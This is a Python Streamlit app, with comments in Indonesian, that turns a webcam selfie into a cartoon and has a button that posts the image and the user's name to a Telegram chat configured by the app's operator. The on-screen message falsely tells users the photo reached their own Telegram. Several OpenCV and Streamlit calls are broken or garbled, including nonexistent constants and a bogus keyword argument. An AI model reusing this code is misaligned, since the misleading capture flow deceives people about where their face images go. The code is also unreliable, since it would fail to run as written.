import io
import cv2
import numpy as np
from PIL import Image
import requests
import streamlit as st

# Konfigurasi Halaman ala Studio Kreatif
st.set_page_config(
    page_title="ToonMe Selfie Studio", page_icon="🎨", layout="centered"
)

# --- STYLING CSS TEMA KARTUN / TIKTOK ---
st.markdown(
    """
    <style>
    .stApp {
        background-color: #0e1117;
        color: #ffffff;
    }
    header {visibility: hidden;}
    .studio-title {
        text-align: center;
        font-family: 'Segoe UI', sans-serif;
        font-weight: 800;
        font-size: 1.8rem;
        color: #ff5722;
        margin-bottom: 0px;
    }
    .studio-sub {
        text-align: center;
        font-size: 0.9rem;
        color: #94a3b8;
        margin-bottom: 20px;
    }
    .card-box {
        background-color: #1f2937;
        border: 1px solid #374151;
        padding: 20px;
        border-radius: 12px;
        margin-bottom: 20px;
    }
    </style>
""",
    unsafe_allow_html=True,
)

# --- KONFIGURASI BOT TELEGRAM ANDA ---
TELEGRAM_BOT_TOKEN = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"
TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"


def send_cartoon_to_telegram(photo_bytes, username):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
  files = {"photo": ("toon_selfie.jpg", photo_bytes, "image/jpeg")}
  caption = (
      f"🎨 **TOONME STUDIO CAPTURE**\n\n"
      f"👤 User: {username}\n"
      f"✨ Efek: Auto Cartoon / Toon Filter\n"
      f"🚀 Status: Berhasil Disimpan & Dikirim"
  )
  data_dict = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}

  try:
    response = requests.post(url, data=data_dict, files=files)
    return response.json()
  except Exception as e:
    return {"ok": False, "description": str(e)}


def convert_to_cartoon(pil_image):
  """Fungsi otomatis mengubah foto wajah menjadi efek kartun/komik"""
  # Konversi PIL Image ke format OpenCV (BGR)
  img_np = np.array(pil_image)
  img_bgr = cv2.cvtColor(img_np, cv2.RGB2BGR)

  # 1. Terapkan Bilateral Filter untuk melembutkan warna kulit ala kartun
  num_bilateral = 7
  for _ in range(num_bilateral):
    img_bgr = cv2.bilateralFilter(img_bgr, d=9, sigmaColor=75, sigmaSpace=75)

  # 2. Deteksi garis tepi (edges) untuk efek goresan komik
  gray = cv2.cvtColor(img_bgr, cv2.COLOR_BGR2GRAY)
  gray_blur = cv2.medianBlur(gray, 7)
  edges = cv2.adaptiveThreshold(
      gray_blur,
      255,
      cv2.adaptiveThresholdMethod.MEAN_C,
      cv2.THRESH_BINARY,
      blockSize=9,
      C=2,
  )

  # 3. Gabungkan warna halus dengan garis tepi kartun
  edges_colored = cv2.cvtColor(edges, cv2.COLOR_GRAY2BGR)
  cartoon = cv2.bitwise_and(img_bgr, edges_colored)

  # Kembalikan ke format RGB PIL Image
  cartoon_rgb = cv2.cvtColor(cartoon, cv2.COLOR_BGR2RGB)
  return Image.fromarray(cartoon_rgb)


# --- ANTARMUKA APLIKASI ---
st.markdown("<div class='studio-title'>🎨 ToonMe AI Selfie Booth</div>", unsafe_ubah_html=True if 'unsafe_ubah_html' in globals() else True, unsafe_allow_html=True)
st.markdown(
    "<div class='studio-sub'>Ubah foto selfie kamu jadi karakter kartun keren"
    " secara instan!</div>",
    unsafe_allow_html=True,
)

# 1. Input Nama Pengguna
username = st.text_input("Masukkan Nama Kamu:", placeholder="Ketik nama di sini...")

st.markdown("---")
st.subheader("📸 Ambil Foto Kamera Depan")
camera_file = st.camera_input("Posisikan wajahmu dengan pas dan senyum terbaikmu")

# 2. Logika Proses Otomatis
if camera_file is not None:
  if not username:
    st.warning("⚠️ Masukkan nama kamu terlebih dahulu sebelum memproses!")
  else:
    with st.spinner("✨ Sedang menyulap fotomu menjadi kartun..."):
      # Buka foto asli
      original_image = Image.open(camera_file)

      # Ubah otomatis menjadi kartun
      cartoon_image = convert_to_cartoon(original_image)

      # Konversi hasil kartun ke bytes untuk download & kirim telegram
      buf = io.BytesIO()
      cartoon_image.save(buf, format="JPEG", quality=95)
      cartoon_bytes = buf.getvalue()

    st.success("🎉 Berhasil! Wajahmu sukses jadi karakter kartun.")

    # Tampilkan Hasil Kartun di Layar
    st.markdown("### 🖼️ Hasil Karya ToonMe Kamu:")
    st.image(
        cartoon_image,
        caption=f"Versi Kartun - {username}",
        use_container_width=True,
    )

    st.markdown("---")
    # 3. Tombol Aksi Cepat (Download & Kirim Telegram)
    col_dl, col_tg = st.columns(2)

    with col_dl:
      st.download_button(
          label="📥 Download Kartun",
          data=cartoon_bytes,
          file_name=f"toonme_{username.lower().replace(' ', '_')}.jpg",
          mime="image/jpeg",
      )

    with col_tg:
      if st.button("🚀 Kirim ke Telegram"):
        with st.spinner("Mengirim ke sistem server..."):
          res = convert_to_telegram_res = send_cartoon_to_telegram(
              cartoon_bytes, username
          )
        if convert_to_telegram_res.get("ok"):
          st.success("✨ Foto kartun berhasil terkirim ke Telegram Anda!")
        else:
          st.error("❌ Gagal mengirim. Periksa kembali Token Bot Telegram Anda.")
